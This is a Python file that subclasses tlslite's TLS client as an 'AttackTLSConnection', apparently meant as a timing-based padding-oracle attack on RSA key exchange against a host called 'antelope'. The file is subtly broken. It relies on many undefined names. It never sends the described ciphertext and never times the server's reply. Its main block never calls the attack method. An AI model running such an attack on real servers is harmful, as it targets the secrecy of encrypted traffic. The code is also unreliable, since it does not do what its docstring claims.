import socket
import tlslite
import http_client


class AttackTLSConnection(tlslite.TLSConnection):
    """
    Modified version of tlslite.TLSConnection which replaces the handshake
    function with one that sends a predetermined ciphertext, g, instead of
    the ClientKeyExchange message.

    It also ... times the time taken for the server to respond and returns
    this value to the caller of performHandshakeAttack().
    """

    def performHandshakeAttack(
        self,
        session=None,
        settings=None,
        checker=None,
        nextProtos=None,
        reqTack=True,
        serverName=None,
        async_=False,
        alpn=None,
    ):
        self._handshakeStart(client=True)

        if reqTack:
            if not tackpyLoaded:
                reqTack = False
            if not settings or not settings.useExperimentalTackExtension:
                reqTack = False

        if nextProtos is not None:
            if len(nextProtos) == 0:
                raise ValueError("Caller passed no nextProtos")

        if alpn is not None and not alpn:
            raise ValueError("Caller passed empty alpn list")

        # Reject invalid hostnames but accept empty/None ones
        if serverName and not is_valid_hostname(serverName):
            raise ValueError(
                "Caller provided invalid server host name: {0}".format(serverName)
            )

        # Validates the settings and filters out any unsupported ciphers
        # or crypto libraries that were requested
        if not settings:
            settings = HandshakeSettings()
            settings = settings.validate()
            self.sock.padding_cb = settings.padding_cb

        if session:
            # session.valid() ensures session is resumable and has
            # non-empty sessionID
            if not session.valid():
                session = None  # ignore non-resumable sessions...
            elif session.resumable:
                if session.srpUsername != srpUsername:
                    raise ValueError("Session username doesn't match")
                if session.serverName != serverName:
                    raise ValueError("Session servername doesn't match")

        # Tentatively set the client's record version.
        # We'll use this for the ClientHello, and if an error occurs
        # parsing the Server Hello, we'll use this version for the response
        # in TLS 1.3 it always needs to be set to TLS 1.0
        self.version = (3, 1) if settings.maxVersion > (3, 3) else settings.maxVersion

        # OK Start sending messages!
        # *****************************

        # Send the ClientHello.
        for result in self._clientSendClientHello(
            settings,
            session,
            srpUsername,
            srpParams,
            certParams,
            anonParams,
            serverName,
            nextProtos,
            reqTack,
            alpn,
        ):
            clientHello = result

        # Get the ServerHello.
        for result in self._clientGetServerHello(settings, session, clientHello):
            serverHello = result
            cipherSuite = serverHello.cipher_suite

        # Choose a matching Next Protocol from server list against ours
        # (string or None)
        nextProto = self._clientSelectNextProto(nextProtos, serverHello)

        # Check if server selected encrypt-then-MAC
        if serverHello.getExtension(ExtensionType.encrypt_then_mac):
            self._recordLayer.encryptThenMAC = True

        if serverHello.getExtension(ExtensionType.extended_master_secret):
            self.extendedMasterSecret = True

        # Don't bother with other types of key exchange, this attack is on RSA.
        keyExchange = RSAKeyExchange(cipherSuite, clientHello, serverHello, None)

        # We'll send a few messages here, send them in single TCP packet
        # Umm ... no not this time
        self.sock.buffer_writes = True
        for result in self._clientKeyExchange(
            settings,
            cipherSuite,
            clientCertChain,
            privateKey,
            serverHello.certificate_type,
            serverHello.tackExt,
            clientHello.random,
            serverHello.random,
            keyExchange,
        ):
            if result in (0, 1):
                yield result
            else:
                break
            (premasterSecret, serverCertChain, clientCertChain, tackExt) = result


if __name__ == "__main__":
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("antelope", 443))

    connection = AttackTLSConnection(sock)
    connection.handshakeClientCert()

    req = http_client.make_http_request("GET", "antelope")
    connection.write(req)
